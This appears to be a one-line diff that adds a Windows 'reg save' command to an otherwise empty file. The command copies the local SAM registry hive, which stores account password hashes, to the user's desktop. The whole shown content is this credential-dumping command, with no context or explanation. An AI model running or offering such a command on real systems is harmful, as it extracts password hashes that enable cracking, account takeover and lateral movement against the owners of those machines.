@@ -1,0 +1,1 @@
+reg save HKLM\Sam %userprofile%\desktop\sam.hiv
